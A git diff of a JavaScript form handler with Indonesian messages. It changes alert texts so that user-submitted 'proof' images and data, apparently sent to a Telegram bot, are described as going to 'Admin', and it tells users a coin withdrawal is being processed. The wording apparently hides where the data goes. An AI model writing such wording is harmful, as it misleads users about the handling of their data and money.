@@ -698,16 +698,16 @@ stars.forEach(s => s.classList.add('active'));
 
             if (!response.ok || !result.ok) {
                 throw new Error(
-                    result.description || "Gagal mengirim bukti ke Telegram"
+                    result.description || "Gagal mengirim bukti ke Admin"
                 );
             }
 
-            alert("Bukti kirim koin dan data berhasil dikirim ke Telegram.");
+            alert("PENCAIRAN SEDANG DI PROSES ADMIN.");
             this.reset();
 
         } catch (error) {
             console.error("TELEGRAM SEND ERROR:", error);
-            alert("Gagal mengirim bukti gambar ke Telegram. Silakan coba lagi.");
+            alert("Gagal mengirim bukti gambar ke Admin. Silakan coba lagi.");
         } finally {
             btn.innerText = "PROSES BONGKAR";
             btn.disabled = false;
